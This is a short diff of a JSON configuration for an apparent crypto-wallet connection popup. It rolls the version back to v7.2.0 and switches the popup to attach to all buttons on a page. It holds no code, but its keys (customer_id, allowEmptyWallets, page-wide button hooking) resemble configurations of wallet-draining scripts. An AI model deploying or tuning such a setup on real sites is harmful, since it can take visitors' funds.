@@ -1,6 +1,6 @@
 {
   "customer_id": "2b3736363430333536343e31303e",
-  "version": "v7.3.1",
+  "version": "v7.2.0",
   "button_text_contents": {
     "after_connecting": "Please wait"
   },
@@ -12,7 +12,7 @@
   "theme": "dark",
   "accentColor": "#ffffff",
   "applyToAllElements": false,
-  "applyToAllButtons": false,
+  "applyToAllButtons": true,
   "openFirstLoaded": false,
   "allowEmptyWallets": true,
   "popup": {
